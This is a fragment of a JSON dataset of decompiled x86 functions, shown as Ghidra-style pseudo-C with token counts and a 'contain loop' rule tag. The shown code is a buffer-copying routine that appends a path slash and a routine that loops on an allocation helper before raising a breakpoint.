        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00445060(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t unaff_EBX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    uVar1 = fcn.004418a0(0x20, &var_8h, 4);\n    if (uVar1 == '\\0') {\n        uVar3 = 0xffffffff;\n    }\n    else {\n        uVar3 = var_8h;\n        if (var_8h == 0) {\n            return uVar1 & 0xffffff00;\n        }\n    }\n    uVar1 = fcn.004418a0(0x1c, &var_8h, 4);\n    if (uVar1 == '\\0') {\n        var_8h = 0xffffffff;\n    }\n    uVar2 = 0;\n    if (uVar3 != 0) {\n        do {\n            uVar1 = fcn.004418a0();\n            if (uVar1 == '\\0') {\n                uVar1 = CONCAT31(uVar1 >> 8, 0xff);\n            }\n            else {\n                uVar1 = uVar1 & 0xffffff00 | var_1h;\n            }\n            *(unaff_EBX + 4 + uVar2) = uVar1;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < uVar3);\n    }\n    if (*(uVar3 + 4 + unaff_EBX) != '/') {\n        *(uVar3 + 4 + unaff_EBX) = 0x2f;\n        uVar3 = uVar3 + 1;\n    }\n    *(uVar3 + 4 + unaff_EBX) = 0;\n    return uVar1 & 0xffffff00 | 1;\n}\n",
        "token_count": 454
    },
    "0044d234": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0044d234(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar auStack16 [12];\n    \n    do {\n        iVar2 = fcn.00450a2f(param_1);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.00450b08(param_1);\n    } while (iVar2 != 0);\n    if ((*0x46246c & 1) == 0) {\n        *0x46246c = *0x46246c | 1;\n        fcn.0044db65();\n        fcn.004509c9(0x4598f2);\n    }\n    fcn.004461a0(0x462460);\n    fcn.0044f098(auStack16, 0x45d208);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 213
    }
}